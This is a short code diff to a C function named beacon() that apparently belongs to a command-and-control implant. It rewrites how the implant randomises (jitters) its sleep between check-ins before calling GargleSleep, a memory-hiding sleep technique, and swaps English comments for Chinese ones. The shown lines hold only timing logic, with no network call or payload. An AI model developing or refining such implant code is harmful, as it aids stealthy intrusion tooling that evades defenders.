@@ -242,19 +242,15 @@ void beacon(LPVOID lpReserved) {
 				GargleSleep(sleep_time);
 			}
 			else {
-			    unsigned int sxjd100 = ((sleep_time * jitter) / 100);
-			    if (sxjd100 > 0) {
-    				adjust = (bigger_rand() % sxjd100);
-			    } else {
-			        // when "sleep_time * jitter" is less than 100, sleep_time is too small to jitter.
-    				adjust = 0;
-			    }
-
-    			// dlog("beacon.beacon - Ready to GargleSleep! Sleep Time: %u Jitter: %u Adjustment: %u sxjd100: %u \n", sleep_time, jitter, adjust, sxjd100);
-				if (adjust < sleep_time) {
-					GargleSleep(sleep_time - adjust);
+				// 改进的抖动计算
+				unsigned int max_jitter = (sleep_time * jitter) / 100;
+				if (max_jitter > 0) {
+					adjust = bigger_rand() % max_jitter;
+					// 确保调整值不会导致负数或过大的休眠时间
+					unsigned int final_sleep = (adjust <= sleep_time / 2) ? 
+						(sleep_time - adjust) : (sleep_time + adjust) / 2;
+					GargleSleep(final_sleep);
 				} else {
-				    // Not sure how we got here, but we should probably still try to sleep...
 					GargleSleep(sleep_time);
 				}
 			}
